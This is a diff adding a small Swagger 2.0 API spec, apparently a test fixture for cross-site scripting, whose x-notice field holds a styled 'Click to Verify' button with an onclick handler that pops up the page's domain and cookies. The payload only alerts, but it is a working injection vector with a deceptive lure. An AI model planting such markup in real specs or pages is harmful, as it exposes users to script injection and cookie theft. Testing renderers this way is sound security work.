@@ -1,0 +1,12 @@
+swagger: '2.0'
+info:
+  title: Alert Test
+  x-notice: |
+    <div style="text-align: center; margin: 30px 0;">
+      <button style="padding: 14px 32px; font-size: 18px; background: #dc3545; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold;"
+              onclick="alert('XSS from button!\n\nDomain: ' + document.domain + '\nCookie: ' + document.cookie)">
+        ⚠️ Important – Click to Verify
+      </button>
+    </div>
+  version: 1.0.0
+paths: {}
